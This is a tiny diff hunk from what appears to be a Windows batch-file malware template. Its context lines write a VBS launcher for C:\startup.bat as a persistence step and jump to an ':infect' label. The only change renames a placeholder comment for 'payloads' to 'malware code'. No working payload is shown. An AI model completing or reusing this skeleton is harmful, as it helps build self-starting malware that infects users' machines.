@@ -72,7 +72,7 @@ echo.shell.run "C:\startup.bat">>C:\CmdLoad.vbs
 goto infect
 
 :infect
-REM this were you going to put your payloads
+REM this were you going to put your malware code
 
 goto end
 
